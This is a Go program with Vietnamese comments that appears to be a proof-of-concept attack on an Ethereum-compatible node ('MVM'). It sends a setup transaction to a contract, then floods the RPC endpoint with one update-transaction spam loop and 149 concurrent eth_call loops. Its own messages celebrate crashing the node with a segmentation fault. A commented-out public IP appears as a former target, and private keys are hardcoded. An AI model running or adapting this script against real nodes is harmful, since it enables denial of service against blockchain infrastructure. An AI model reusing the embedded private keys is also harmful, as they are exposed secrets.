//go:build ignore

package main

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"sync"
	"time"

	"github.com/ethereum/go-ethereum"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
)

const (
	// rpcURL          = "http://139.59.243.85:8545"
	rpcURL          = "http://127.0.0.1:8545"
	contractAddress = "0xc3Ae1dE2Fc9863A50b83928BB53C475d99540421"

	// Khởi tạo
	callDataSetup = "0x925ada52" // runStep1_Setup()

	// Luồng Gọi Đọc (ReadBack) - Dùng eth_call
	callDataRead = "0x47cdef16" // runStep2_ReadBack()

	// Luồng Gây Đột Biến (UpdateDoc) - Dùng send transaction
	callDataUpdate = "0xef2be83c" // runStep3_UpdateDoc()
	// pkHex          = "28f0ad246c39b9b5a32692e4f9364e29c3df3cdd6ca6d88fcb40e9dc6bc6c511"
	pkHex = "2b3aa0f620d2d73c046cd93eb64f2eb687a95b22e278500aa251c8c9dda1203b"

	threads = 150
)

type rpcRequest struct {
	JsonRPC string        `json:"jsonrpc"`
	Method  string        `json:"method"`
	Params  []interface{} `json:"params"`
	ID      int           `json:"id"`
}

func sendTx(client *ethclient.Client, privateKey *ecdsa.PrivateKey, toAddress common.Address, data []byte, chainID *big.Int) error {
	fromAddress := crypto.PubkeyToAddress(privateKey.PublicKey)
	nonce, err := client.PendingNonceAt(context.Background(), fromAddress)
	if err != nil {
		return fmt.Errorf("nonce error: %v", err)
	}

	gasPrice, err := client.SuggestGasPrice(context.Background())
	if err != nil {
		return fmt.Errorf("gasPrice error: %v", err)
	}

	msg := ethereum.CallMsg{From: fromAddress, To: &toAddress, GasPrice: gasPrice, Data: data}
	gasLimit, err := client.EstimateGas(context.Background(), msg)
	if err != nil {
		gasLimit = 3000000 // Fallback
	} else {
		gasLimit += 50000
	}

	tx := types.NewTransaction(nonce, toAddress, big.NewInt(0), gasLimit, gasPrice, data)
	signedTx, err := types.SignTx(tx, types.NewEIP155Signer(chainID), privateKey)
	if err != nil {
		return fmt.Errorf("sign error: %v", err)
	}

	err = client.SendTransaction(context.Background(), signedTx)
	if err != nil {
		return fmt.Errorf("send error: %v", err)
	}

	// Wait for receipt (optional, but good for setup)
	for {
		receipt, err := client.TransactionReceipt(context.Background(), signedTx.Hash())
		if err == nil && receipt != nil {
			if receipt.Status != 1 {
				return fmt.Errorf("tx failed")
			}
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	return nil
}

func sendSpamTx(client *ethclient.Client, privateKey *ecdsa.PrivateKey, toAddress common.Address, data []byte, chainID *big.Int, workerID int) {
	fromAddress := crypto.PubkeyToAddress(privateKey.PublicKey)
	for {
		nonce, err := client.PendingNonceAt(context.Background(), fromAddress)
		if err != nil {
			time.Sleep(1 * time.Second)
			continue
		}

		gasPrice, _ := client.SuggestGasPrice(context.Background())
		if gasPrice == nil {
			gasPrice = big.NewInt(1000000000)
		}

		tx := types.NewTransaction(nonce, toAddress, big.NewInt(0), 3000000, gasPrice, data)
		signedTx, err := types.SignTx(tx, types.NewEIP155Signer(chainID), privateKey)
		if err == nil {
			err = client.SendTransaction(context.Background(), signedTx)
			if err != nil {
				fmt.Printf("❌ [Luồng Update %d] Lỗi SendTx: %v | TxHash: %s | Nonce: %d\n", workerID, err, signedTx.Hash().Hex(), nonce)
			} else {
				fmt.Printf("✅ [Luồng Update %d] Đã gửi Tx: %s | Nonce: %d\n", workerID, signedTx.Hash().Hex(), nonce)
			}
		}
		time.Sleep(100 * time.Millisecond) // Tránh spam quá mức gây lỗi nonce chain
	}
}

func main() {
	fmt.Printf("🔥 Bắt đầu tàn phá MVM với Config Mới...\n")

	client, err := ethclient.Dial(rpcURL)
	if err != nil {
		log.Fatalf("Không kết nối được ethclient: %v", err)
	}

	privateKey, err := crypto.HexToECDSA(pkHex)
	if err != nil {
		log.Fatalf("Lỗi PK: %v", err)
	}

	chainID, err := client.NetworkID(context.Background())
	if err != nil {
		log.Fatalf("Lỗi lấy ChainID: %v", err)
	}

	toAddr := common.HexToAddress(contractAddress)

	// Lần đầu: Gọi runStep1_Setup
	fmt.Println("⏳ Đang chạy runStep1_Setup cho lần đầu tiên...")
	setupData := common.FromHex(callDataSetup)
	err = sendTx(client, privateKey, toAddr, setupData, chainID)
	if err != nil {
		fmt.Printf("⚠️ Lỗi chạy Setup (có thể đã setup rồi, bỏ qua): %v\n", err)
	} else {
		fmt.Println("✅ Setup thành công!")
	}

	fmt.Printf("🔥 Bắt đầu Spam: %d luồng Đọc (eth_call) & 1 luồng Update (sendTx)\n", threads-1)

	var wg sync.WaitGroup

	// 1 Luồng duy nhất gọi runStep3_UpdateDoc (Gửi TX)
	wg.Add(1)
	go func() {
		defer wg.Done()
		updateData := common.FromHex(callDataUpdate)
		sendSpamTx(client, privateKey, toAddr, updateData, chainID, 0)
	}()

	// Threads - 1 luồng gọi eth_call cho callDataRead
	for i := 1; i < threads; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			httpClient := &http.Client{Timeout: 5 * time.Second}

			for {
				reqBody := rpcRequest{
					JsonRPC: "2.0",
					Method:  "eth_call",
					Params: []interface{}{
						map[string]string{
							"to":   contractAddress,
							"data": callDataRead,
						},
						"latest",
					},
					ID: workerID,
				}

				payload, _ := json.Marshal(reqBody)
				resp, err := httpClient.Post(rpcURL, "application/json", bytes.NewBuffer(payload))

				if err != nil {
					fmt.Printf("❌ [Luồng Read %d] Đã dập nát Node! SIGSEGV cmnr!\n", workerID)
					time.Sleep(2 * time.Second)
					continue
				}

				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
			}
		}(i)
	}

	wg.Wait()
}
